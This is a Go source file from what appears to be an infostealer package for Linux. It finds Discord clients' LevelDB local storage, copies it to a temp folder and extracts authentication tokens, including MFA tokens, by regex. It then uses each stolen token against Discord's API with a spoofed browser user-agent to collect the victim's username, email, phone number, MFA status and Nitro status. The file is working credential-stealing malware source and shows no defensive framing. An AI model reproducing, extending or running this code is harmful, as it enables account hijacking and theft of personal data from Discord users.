//go:build linux

package infostealer

import (
	"encoding/json"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"regexp"

	"github.com/syndtr/goleveldb/leveldb"
	"github.com/syndtr/goleveldb/leveldb/opt"
)

var leveldbLocations = []string{
	filepath.Join(home, ".config", "discord", "Local Storage", "leveldb"),
	filepath.Join(home, ".config", "discordcanary", "Local Storage", "leveldb"),
	filepath.Join(home, ".config", "discordptb", "Local Storage", "leveldb"),
	filepath.Join(home, "snap", "discord", "current", ".config", "discord", "Local Storage", "leveldb"),
	filepath.Join(home, ".var", "app", "com.discordapp.Discord", "config", "discord", "Local Storage", "leveldb"),
	filepath.Join(home, ".var", "app", "com.discordapp.DiscordCanary", "config", "discordcanary", "Local Storage", "leveldb"),
	filepath.Join(home, ".config", "vesktop", "session", "Local Storage", "leveldb"),
}

func getLevelDBLocation() string {
	for _, location := range leveldbLocations {
		if _, err := os.Stat(location); err == nil {
			return location
		}
	}
	return ""
}

func copyLevelDB(sourcepath string) string {
	if sourcepath == "" {
		return ""
	}
	foldername := filepath.Join(os.TempDir(), randomstring(10))
	os.MkdirAll(foldername, 0755)

	files, err := os.ReadDir(sourcepath)
	if err != nil {
		return ""
	}

	for _, file := range files {
		if file.IsDir() {
			continue
		}

		srcPath := filepath.Join(sourcepath, file.Name())
		dstPath := filepath.Join(foldername, file.Name())

		src, err := os.Open(srcPath)
		if err != nil {
			continue
		}

		dst, err := os.Create(dstPath)
		if err != nil {
			src.Close()
			continue
		}

		io.Copy(dst, src)
		src.Close()
		dst.Close()
	}

	os.Remove(filepath.Join(foldername, "LOCK"))
	return foldername
}

type userData struct {
	Username    string `json:"username"`
	DisplayName string `json:"global_name"`
	Email       string `json:"email"`
	PhoneNumber string `json:"phone"`
	MultiFactor bool   `json:"mfa_enabled"`
	Nitro       int    `json:"premium_type"`
}

type Discord struct {
	Userdata userData
	Token    string
}

func getDiscordTokens() []Discord {
	location := getLevelDBLocation()
	if location == "" {
		return nil
	}

	tempDir := copyLevelDB(location)
	if tempDir == "" {
		return nil
	}
	defer os.RemoveAll(tempDir)

	db, err := leveldb.OpenFile(tempDir, &opt.Options{
		ReadOnly: true,
	})
	if err != nil {
		return nil
	}
	defer db.Close()

	// Using both regexes for normal and mfa tokens
	re := regexp.MustCompile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}`)
	var accounts []Discord
	seen := make(map[string]bool)

	iter := db.NewIterator(nil, nil)
	for iter.Next() {
		val := string(iter.Value())
		matches := re.FindAllString(val, -1)
		for _, token := range matches {
			if !seen[token] {
				accounts = append(accounts, Discord{Token: token})
				seen[token] = true
			}
		}
	}
	iter.Release()

	httpclient := &http.Client{}
	for i, account := range accounts {
		req, _ := http.NewRequest("GET", "https://discord.com/api/v9/users/@me", nil)
		req.Header = http.Header{
			"authorization": {account.Token},
			"content-type":  {"application/json"},
			"user-agent":    {"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"},
		}

		resp, err := httpclient.Do(req)
		if err != nil {
			continue
		}

		if resp.StatusCode == 200 {
			var u userData
			json.NewDecoder(resp.Body).Decode(&u)
			accounts[i].Userdata = u
		}
		resp.Body.Close()
	}

	return accounts
}
